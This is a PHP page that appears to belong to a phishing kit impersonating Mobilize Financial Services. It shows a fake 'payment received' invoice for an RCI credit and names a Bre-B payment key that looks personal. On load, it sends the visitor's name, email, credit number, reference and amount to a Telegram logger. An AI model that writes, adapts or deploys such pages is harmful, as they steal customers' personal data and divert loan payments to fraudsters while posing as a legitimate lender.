<?php
session_start();
require_once __DIR__ . '/includes/telegram-logger.php';

if (empty($_SESSION['userInfo']) || empty($_SESSION['creditNumber'])) {
    header('Location: index.html');
    exit;
}

$userInfo     = $_SESSION['userInfo'];
$creditNumber = $_SESSION['creditNumber'];
$payment      = $_SESSION['payment'] ?? [];
$reference    = $_SESSION['paymentReference'] ?? ('REF-' . time());

$fullName = trim((string) ($userInfo['NOMBRE_COMPLETO'] ?? 'Cliente demo'));
$email    = (string) ($userInfo['EMAIL'] ?? 'cliente@demo.com');
$concept  = (string) ($payment['concept'] ?? 'Pago credito RCI');
$valueToPay = (float) ($payment['valueToPay'] ?? $payment['minPayment'] ?? 0);
$brebKey = '@LITTIO1129540006';

if (isset($_GET['paid']) && $_GET['paid'] === '1') {
    $_SESSION['demoInvoicePaidAt'] = date('Y-m-d H:i:s');
}

$paidAt = $_SESSION['demoInvoicePaidAt'] ?? date('Y-m-d H:i:s');
$invoiceNumber = 'FAC-DEMO-' . substr(preg_replace('/\D+/', '', $reference), -8);

function formatMoneyCOInvoice($value): string {
    return '$ ' . number_format((float) $value, 2, ',', '.');
}

function formatDateTimeInvoice(string $value): string {
    $ts = strtotime($value);
    return $ts ? date('d/m/Y H:i:s', $ts) : $value;
}

telegram_log('🧾 Vista factura demo', [
    'Factura' => $invoiceNumber,
    'Referencia' => $reference,
    'Crédito' => $creditNumber,
    'Cliente' => $fullName,
    'Valor' => formatMoneyCOInvoice($valueToPay),
    'Método' => 'Bre-B',
]);
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Factura demo - Mobilize Financial Services</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="assets/css/styles.css">
</head>
<body class="invoice-demo-body">

<div class="invoice-demo-shell">
  <div class="invoice-demo-card">
    <div class="invoice-demo-header">
      <img class="invoice-demo-logo" src="assets/images/download.svg" alt="Mobilize Financial Services">
      <div class="invoice-demo-header-text">
        <span class="invoice-demo-eyebrow"> </span>
        <h1>Pago recibido con exito</h1>
       
      </div>
      <span class="invoice-demo-badge">Pagado</span>
    </div>

    <div class="invoice-demo-summary">
      <div>
        <span class="invoice-demo-summary-label">Factura</span>
        <strong><?php echo htmlspecialchars($invoiceNumber, ENT_QUOTES, 'UTF-8'); ?></strong>
      </div>
      <div>
        <span class="invoice-demo-summary-label">Fecha de pago</span>
        <strong><?php echo htmlspecialchars(formatDateTimeInvoice($paidAt), ENT_QUOTES, 'UTF-8'); ?></strong>
      </div>
      <div>
        <span class="invoice-demo-summary-label">Valor pagado</span>
        <strong><?php echo htmlspecialchars(formatMoneyCOInvoice($valueToPay), ENT_QUOTES, 'UTF-8'); ?></strong>
      </div>
    </div>

    <div class="invoice-demo-grid">
      <section class="invoice-demo-section">
        <h2>Datos del cliente</h2>
        <div class="invoice-demo-list">
          <div class="invoice-demo-item"><span>Cliente</span><strong><?php echo htmlspecialchars($fullName, ENT_QUOTES, 'UTF-8'); ?></strong></div>
          <div class="invoice-demo-item"><span>Correo</span><strong><?php echo htmlspecialchars($email, ENT_QUOTES, 'UTF-8'); ?></strong></div>
          <div class="invoice-demo-item"><span>Credito</span><strong><?php echo htmlspecialchars($creditNumber, ENT_QUOTES, 'UTF-8'); ?></strong></div>
        </div>
      </section>

      <section class="invoice-demo-section">
        <h2>Datos del pago</h2>
        <div class="invoice-demo-list">
          <div class="invoice-demo-item"><span>Referencia</span><strong><?php echo htmlspecialchars($reference, ENT_QUOTES, 'UTF-8'); ?></strong></div>
          <div class="invoice-demo-item"><span>Metodo</span><strong>Bre-B</strong></div>
          <div class="invoice-demo-item"><span>Llave</span><strong><?php echo htmlspecialchars($brebKey, ENT_QUOTES, 'UTF-8'); ?></strong></div>
        </div>
      </section>
    </div>

    <section class="invoice-demo-section invoice-demo-section-full">
      <h2>Detalle</h2>
      <div class="invoice-demo-table">
        <div class="invoice-demo-table-head">
          <span>Concepto</span>
          <span>Cantidad</span>
          <span>Total</span>
        </div>
        <div class="invoice-demo-table-row">
          <span><?php echo htmlspecialchars($concept, ENT_QUOTES, 'UTF-8'); ?></span>
          <span>1</span>
          <strong><?php echo htmlspecialchars(formatMoneyCOInvoice($valueToPay), ENT_QUOTES, 'UTF-8'); ?></strong>
        </div>
      </div>
    </section>

    <div class="invoice-demo-total">
      <span>Total abonado</span>
      <strong><?php echo htmlspecialchars(formatMoneyCOInvoice($valueToPay), ENT_QUOTES, 'UTF-8'); ?></strong>
    </div>

   

    <div class="invoice-demo-actions">
      <button type="button" class="invoice-demo-print" onclick="window.print()">Imprimir</button>
      <a class="invoice-demo-home" href="index.html">Volver al inicio</a>
    </div>
  </div>
</div>

</body>
</html>
